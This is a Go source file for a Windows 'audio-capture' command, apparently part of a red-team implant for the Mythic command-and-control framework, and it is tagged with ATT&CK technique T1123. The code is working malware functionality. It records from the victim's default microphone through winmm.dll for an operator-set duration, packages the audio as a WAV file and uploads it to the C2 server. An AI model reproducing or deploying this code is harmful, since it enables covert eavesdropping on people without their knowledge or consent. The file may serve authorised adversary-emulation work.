//go:build windows

package commands

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type AudioCaptureCommand struct{}

func (c *AudioCaptureCommand) Name() string        { return "audio-capture" }
func (c *AudioCaptureCommand) Description() string { return "Record audio from microphone (T1123)" }

var (
	winmm                = windows.NewLazySystemDLL("winmm.dll")
	procWaveInOpen       = winmm.NewProc("waveInOpen")
	procWaveInClose      = winmm.NewProc("waveInClose")
	procWaveInStart      = winmm.NewProc("waveInStart")
	procWaveInStop       = winmm.NewProc("waveInStop")
	procWaveInReset      = winmm.NewProc("waveInReset")
	procWaveInPrepareHdr = winmm.NewProc("waveInPrepareHeader")
	procWaveInUnprepHdr  = winmm.NewProc("waveInUnprepareHeader")
	procWaveInAddBuffer  = winmm.NewProc("waveInAddBuffer")
	procWaveInGetNumDevs = winmm.NewProc("waveInGetNumDevs")
)

const (
	waveFormatPCM = 1
	callbackEvent = 0x00050000 // CALLBACK_EVENT
	waveMapperID  = 0xFFFFFFFF // WAVE_MAPPER — default device
	whdrDone      = 0x00000001
)

// WAVEFORMATEX structure
type waveFormatEx struct {
	FormatTag      uint16
	Channels       uint16
	SamplesPerSec  uint32
	AvgBytesPerSec uint32
	BlockAlign     uint16
	BitsPerSample  uint16
	ExtraSize      uint16
}

// WAVEHDR structure for 64-bit Windows
type waveHdr struct {
	Data          uintptr
	BufferLength  uint32
	BytesRecorded uint32
	User          uintptr
	Flags         uint32
	Loops         uint32
	Next          uintptr
	Reserved      uintptr
}

func (c *AudioCaptureCommand) Execute(task structs.Task) structs.CommandResult {
	params, parseErr := unmarshalParams[audioCaptureParams](task)
	if parseErr != nil {
		return *parseErr
	}
	audioDefaultParams(&params)

	bitsPerSample := 16
	blockAlign := params.Channels * (bitsPerSample / 8)
	byteRate := params.SampleRate * blockAlign

	// Check if any audio input devices exist
	numDevs, _, _ := procWaveInGetNumDevs.Call()
	if numDevs == 0 {
		return errorf("No audio input devices found")
	}

	// Set up WAVEFORMATEX
	wfx := waveFormatEx{
		FormatTag:      waveFormatPCM,
		Channels:       uint16(params.Channels),
		SamplesPerSec:  uint32(params.SampleRate),
		AvgBytesPerSec: uint32(byteRate),
		BlockAlign:     uint16(blockAlign),
		BitsPerSample:  uint16(bitsPerSample),
		ExtraSize:      0,
	}

	// Create event for callback
	event, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return errorf("CreateEvent failed: %v", err)
	}
	defer windows.CloseHandle(event)

	// Open waveIn device
	var hWaveIn uintptr
	ret, _, _ := procWaveInOpen.Call(
		uintptr(unsafe.Pointer(&hWaveIn)),
		uintptr(waveMapperID),
		uintptr(unsafe.Pointer(&wfx)),
		uintptr(event),
		0,
		callbackEvent,
	)
	if ret != 0 {
		return errorf("waveInOpen failed (error %d) — no microphone or access denied", ret)
	}
	defer procWaveInClose.Call(hWaveIn)

	// Allocate recording buffers (double-buffering for continuous capture)
	bufSize := byteRate // 1 second per buffer
	numBuffers := 2

	type bufInfo struct {
		hdr  waveHdr
		data []byte
	}
	buffers := make([]bufInfo, numBuffers)

	var collectedData []byte
	var mu sync.Mutex

	for i := range buffers {
		buffers[i].data = make([]byte, bufSize)
		buffers[i].hdr = waveHdr{
			Data:         uintptr(unsafe.Pointer(&buffers[i].data[0])),
			BufferLength: uint32(bufSize),
		}
		ret, _, _ = procWaveInPrepareHdr.Call(hWaveIn, uintptr(unsafe.Pointer(&buffers[i].hdr)), uintptr(unsafe.Sizeof(buffers[i].hdr)))
		if ret != 0 {
			return errorf("waveInPrepareHeader failed (error %d)", ret)
		}
		ret, _, _ = procWaveInAddBuffer.Call(hWaveIn, uintptr(unsafe.Pointer(&buffers[i].hdr)), uintptr(unsafe.Sizeof(buffers[i].hdr)))
		if ret != 0 {
			return errorf("waveInAddBuffer failed (error %d)", ret)
		}
	}

	// Start recording
	ret, _, _ = procWaveInStart.Call(hWaveIn)
	if ret != 0 {
		return errorf("waveInStart failed (error %d)", ret)
	}

	startTime := time.Now()
	deadline := startTime.Add(time.Duration(params.Duration) * time.Second)

	// Collection loop
	for !task.DidStop() && time.Now().Before(deadline) {
		windows.WaitForSingleObject(event, 1000)

		for i := range buffers {
			if buffers[i].hdr.Flags&whdrDone != 0 {
				recorded := int(buffers[i].hdr.BytesRecorded)
				if recorded > 0 {
					chunk := make([]byte, recorded)
					copy(chunk, buffers[i].data[:recorded])
					mu.Lock()
					collectedData = append(collectedData, chunk...)
					mu.Unlock()
				}

				buffers[i].hdr.Flags = 0
				buffers[i].hdr.BytesRecorded = 0
				procWaveInAddBuffer.Call(hWaveIn, uintptr(unsafe.Pointer(&buffers[i].hdr)), uintptr(unsafe.Sizeof(buffers[i].hdr)))
			}
		}
	}

	// Stop and cleanup
	procWaveInStop.Call(hWaveIn)
	procWaveInReset.Call(hWaveIn)

	for i := range buffers {
		if buffers[i].hdr.BytesRecorded > 0 && buffers[i].hdr.Flags&whdrDone != 0 {
			recorded := int(buffers[i].hdr.BytesRecorded)
			chunk := make([]byte, recorded)
			copy(chunk, buffers[i].data[:recorded])
			mu.Lock()
			collectedData = append(collectedData, chunk...)
			mu.Unlock()
		}
		procWaveInUnprepHdr.Call(hWaveIn, uintptr(unsafe.Pointer(&buffers[i].hdr)), uintptr(unsafe.Sizeof(buffers[i].hdr)))
	}

	if len(collectedData) == 0 {
		return errorf("No audio data captured — microphone may not be active")
	}

	// Build WAV file
	wavHeader := buildWAVHeader(len(collectedData), params.SampleRate, params.Channels, bitsPerSample)
	wavData := append(wavHeader, collectedData...)

	// Upload WAV file to Mythic
	uploadMsg := structs.SendFileToMythicStruct{}
	uploadMsg.Task = &task
	uploadMsg.IsScreenshot = false
	uploadMsg.SendUserStatusUpdates = false
	uploadMsg.Data = &wavData
	uploadMsg.FileName = fmt.Sprintf("audio_capture_%s.wav", time.Now().Format("20060102_150405"))
	uploadMsg.FullPath = ""
	uploadMsg.FinishedTransfer = make(chan int, 2)

	task.Job.SendFileToMythic <- uploadMsg

	// Wait for transfer
	for {
		select {
		case <-uploadMsg.FinishedTransfer:
			result := audioCaptureResult{
				Duration:    time.Since(startTime).Truncate(time.Second).String(),
				SampleRate:  params.SampleRate,
				Channels:    params.Channels,
				BitsPerSamp: bitsPerSample,
				DataSize:    len(wavData),
				DeviceUsed:  "default (WAVE_MAPPER)",
			}
			output, _ := json.Marshal(result)
			return successResult(string(output))
		case <-time.After(1 * time.Second):
			if task.DidStop() {
				return errorResult("Audio capture upload cancelled")
			}
		}
	}
}
